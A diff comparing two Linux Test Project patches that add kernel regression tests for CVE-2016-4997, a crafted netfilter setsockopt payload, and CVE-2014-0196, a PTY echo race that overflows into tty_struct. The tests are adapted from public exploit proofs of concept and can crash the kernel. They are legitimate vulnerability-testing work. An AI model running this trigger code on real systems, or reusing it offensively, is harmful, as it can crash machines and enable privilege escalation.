@@ -1,9 +1,9 @@
 From: Richard Palethorpe <rpalethorpe@suse.com>
-Date: Fri, 23 Jun 2017 14:22:05 +0200
-Subject: [LTP] [PATCH v3 3/9] Test for CVE-2016-4997 on setsockopt
+Date: Fri, 23 Jun 2017 14:22:08 +0200
+Subject: [LTP] [PATCH v3 6/9] Test for CVE-2014-0196 PTY echo race
 In-Reply-To: <20170623122211.29575-1-rpalethorpe@suse.com>
 References: <20170623122211.29575-1-rpalethorpe@suse.com>
-Message-ID: <20170623122211.29575-4-rpalethorpe@suse.com>
+Message-ID: <20170623122211.29575-7-rpalethorpe@suse.com>
 List-Id: <ltp.lists.linux.it>
 MIME-Version: 1.0
 Content-Type: text/plain; charset="us-ascii"
@@ -12,19 +12,41 @@ To: ltp@lists.linux.it
 
 Signed-off-by: Richard Palethorpe <rpalethorpe@suse.com>
 ---
- testcases/cve/cve-2016-4997.c | 92 +++++++++++++++++++++++++++++++++++++++++++
- 1 file changed, 92 insertions(+)
- create mode 100644 testcases/cve/cve-2016-4997.c
+ runtest/cve                   |   1 +
+ testcases/cve/.gitignore      |   1 +
+ testcases/cve/cve-2014-0196.c | 161 ++++++++++++++++++++++++++++++++++++++++++
+ 3 files changed, 163 insertions(+)
+ create mode 100644 testcases/cve/cve-2014-0196.c
 
-diff --git a/testcases/cve/cve-2016-4997.c b/testcases/cve/cve-2016-4997.c
+diff --git a/runtest/cve b/runtest/cve
+index 83b53d906..6556ffb0f 100644
+--- a/runtest/cve
++++ b/runtest/cve
+@@ -1,5 +1,6 @@
+ # Tests which check for vulnerabilities by CVE number
+ cve-2012-0957 cve-2012-0957
++cve-2014-0196 cve-2014-0196
+ cve-2016-4997 cve-2016-4997
+ cve-2016-5195 dirtyc0w
+ cve-2016-7117 cve-2016-7117
+diff --git a/testcases/cve/.gitignore b/testcases/cve/.gitignore
+index 9c24b83ec..ff5844263 100644
+--- a/testcases/cve/.gitignore
++++ b/testcases/cve/.gitignore
+@@ -1,3 +1,4 @@
+ cve-2012-0957
++cve-2014-0196
+ cve-2016-4997
+ cve-2016-7117
+diff --git a/testcases/cve/cve-2014-0196.c b/testcases/cve/cve-2014-0196.c
 new file mode 100644
-index 000000000..a413b561e
+index 000000000..4e2b3f582
 --- /dev/null
-+++ b/testcases/cve/cve-2016-4997.c
-@@ -0,0 +1,92 @@
++++ b/testcases/cve/cve-2014-0196.c
+@@ -0,0 +1,161 @@
 +/*
 + * Copyright (c) 2017 Richard Palethorpe <rpalethorpe@suse.com>
-+ * Based on repro-compatReleaseEntry.c by NCC group
++ * Original POC by Matthew Daley <mattd@bugfuzz.com>
 + *
 + * This program is free software: you can redistribute it and/or modify
 + * it under the terms of the GNU General Public License as published by
@@ -40,79 +62,148 @@ index 000000000..a413b561e
 + * along with this program. If not, see <http://www.gnu.org/licenses/>.
 + */
 +/*
-+ * Test for CVE-2016-4997
++ * This test attempts to cause a buffer overflow using the race condition
++ * described in CVE-2014-0196. If the test is successful in causing an
++ * overflow it will most likely result in an immediate Oops, restart or
++ * freeze. However if it overwrites memory not accessed during the test then
++ * it could happen at a later time or not at all which is more likely if SLAB
++ * randomization has been implemented. However as it currently stands, the test
++ * usually crashes as soon as the delay has been calibrated.
 + *
-+ * For a full explanation of how the vulnerability works see:
-+ * https://github.com/nccgroup/TriforceLinuxSyscallFuzzer/tree/master/crash_reports/report_compatIpt
++ * To maximise the chances of the buffer overflow doing immediate detectable
++ * damage the SLAB filler sockets and ioctls from the original exploit POC
++ * have been kept even though they are not strictly necessary to reproduce the
++ * bug.
 + *
-+ * The original vulnerability was present in the 32-bit compatibility system
-+ * call, so the test should be compiled with -m32 and run on a 64-bit kernel.
-+ * For simplicities sake the test requests root privliges instead of creating
-+ * a user namespace.
++ * Further details:
++ * see linux commit 4291086b1f081b869c6d79e5b7441633dc3ace00
++ * privilege escalation POC https://www.exploit-db.com/exploits/33516/
 + */
 +
-+#include <sys/types.h>
-+#include <sys/socket.h>
-+#include <netinet/in.h>
-+#include <net/if.h>
++#include <pty.h>
++#include <stdio.h>
++#include <string.h>
++#include <termios.h>
 +#include <limits.h>
-+#include <linux/netfilter_ipv4/ip_tables.h>
 +
 +#include "tst_test.h"
-+#include "tst_safe_net.h"
-+#include "tst_kernel.h"
++#include "tst_timer.h"
++#include "tst_safe_pthread.h"
 +
-+#define TOO_SMALL_OFFSET 74
-+#define OFFSET_OVERWRITE 0xFFFF
-+#define NEXT_OFFSET (sizeof(struct ipt_entry)		\
-+		     + sizeof(struct xt_entry_match)	\
-+		     + sizeof(struct xt_entry_target))
-+#define PADDING (OFFSET_OVERWRITE - NEXT_OFFSET)
++#include "tst_fuzzy_sync.h"
 +
-+struct payload {
-+	struct ipt_replace repl;
-+	struct ipt_entry ent;
-+	struct xt_entry_match match;
-+	struct xt_entry_target targ;
-+	char padding[PADDING];
-+	struct xt_entry_target targ2;
-+};
++#define ONEOFF_ALLOCS 200
++#define RUN_ALLOCS    30
++#define ATTEMPTS      0x7000
++#define BUFLEN        512
++
++static int master_fd, slave_fd;
++static int filler_ptys[ONEOFF_ALLOCS * 2];
++static int target_ptys[RUN_ALLOCS * 2];
++static char buf[BUFLEN];
++
++static struct tst_fzsync_pair fzsync_pair = TST_FZSYNC_PAIR_INIT;
++
++static void create_pty(int *amaster, int *aslave)
++{
++	if (openpty(amaster, aslave, NULL, NULL, NULL) == -1)
++		tst_brk(TBROK | TERRNO, "pty creation failed");
++}
 +
 +static void setup(void)
 +{
-+	if (tst_kernel_bits() == 32 || sizeof(long) > 4)
-+		tst_res(TCONF,
-+			"The vulnerability was only present in 32-bit compat mode");
++	int i;
++
++	fzsync_pair.delay_inc = 100;
++	for (i = 0; i < ONEOFF_ALLOCS; i++) {
++		create_pty(&filler_ptys[i],
++			   &filler_ptys[i + ONEOFF_ALLOCS]);
++	}
++}
++
++static void *overwrite_thread_fn(void *p)
++{
++	tst_fzsync_delay_b(&fzsync_pair);
++	tst_fzsync_time_b(&fzsync_pair);
++
++	SAFE_WRITE(0, slave_fd, buf, BUFLEN - 1);
++	SAFE_WRITE(0, slave_fd, buf, BUFLEN - 1);
++	SAFE_WRITE(0, slave_fd, buf, BUFLEN);
++
++	return p;
 +}
 +
 +static void run(void)
 +{
-+	int ret, sock_fd;
-+	struct payload p = { 0 };
++	struct termios t;
++	pthread_t overwrite_thread;
++	int i, j;
 +
-+	sock_fd = SAFE_SOCKET(AF_INET, SOCK_DGRAM, 0);
++	tst_res(TINFO, "Attempting to overflow into a tty_struct...");
 +
-+	strncpy(p.match.u.user.name, "icmp", sizeof(p.match.u.user.name));
-+	p.match.u.match_size = OFFSET_OVERWRITE;
++	for (i = 0; i < ATTEMPTS; i++) {
++		create_pty(&master_fd, &slave_fd);
 +
-+	p.ent.next_offset = NEXT_OFFSET;
-+	p.ent.target_offset = TOO_SMALL_OFFSET;
++		for (j = 0; j < RUN_ALLOCS; j++)
++			create_pty(&target_ptys[j],
++				   &target_ptys[j + RUN_ALLOCS]);
++		SAFE_CLOSE(target_ptys[RUN_ALLOCS / 2]);
++		SAFE_CLOSE(target_ptys[RUN_ALLOCS / 2 + RUN_ALLOCS]);
 +
-+	p.repl.num_entries = 2;
-+	p.repl.num_counters = 1;
-+	p.repl.size = sizeof(struct payload);
-+	p.repl.valid_hooks = 0;
++		SAFE_WRITE(0, slave_fd, buf, 1);
 +
-+	ret = setsockopt(sock_fd, SOL_IP, IPT_SO_SET_REPLACE,
-+			 &p, sizeof(struct payload));
-+	tst_res(TPASS | TERRNO, "We didn't cause a crash, setsockopt returned %d", ret);
++		tcgetattr(master_fd, &t);
++		t.c_oflag &= ~OPOST;
++		t.c_lflag |= ECHO;
++		tcsetattr(master_fd, TCSANOW, &t);
++
++		SAFE_PTHREAD_CREATE(&overwrite_thread, NULL,
++				    overwrite_thread_fn, NULL);
++
++		tst_fzsync_delay_a(&fzsync_pair);
++		tst_fzsync_time_a(&fzsync_pair);
++		SAFE_WRITE(0, master_fd, "A", 1);
++
++		SAFE_PTHREAD_JOIN(overwrite_thread, NULL);
++
++		tst_fzsync_pair_update(i, &fzsync_pair);
++
++		if (!(i & 0x1FFF))
++			tst_fzsync_pair_info(&fzsync_pair);
++
++		for (j = 0; j < RUN_ALLOCS; j++) {
++			if (j == RUN_ALLOCS / 2)
++				continue;
++
++			ioctl(target_ptys[j], 0xdeadbeef);
++			ioctl(target_ptys[j + RUN_ALLOCS], 0xdeadbeef);
++			SAFE_CLOSE(target_ptys[j]);
++			SAFE_CLOSE(target_ptys[j + RUN_ALLOCS]);
++		}
++
++		ioctl(master_fd, 0xdeadbeef);
++		ioctl(slave_fd, 0xdeadbeef);
++		SAFE_CLOSE(master_fd);
++		SAFE_CLOSE(slave_fd);
++	}
++
++	tst_res(TPASS, "Nothing bad happened, probably.");
++}
++
++static void cleanup(void)
++{
++	int i;
++
++	for (i = 0; i < ONEOFF_ALLOCS * 2; i++)
++		close(filler_ptys[i]);
++	close(master_fd);
++	close(slave_fd);
 +}
 +
 +static struct tst_test test = {
-+	.min_kver = "2.6.32",
 +	.setup = setup,
++	.cleanup = cleanup,
 +	.test_all = run,
-+	.needs_root = 1,
 +};
 -- 
 2.12.2
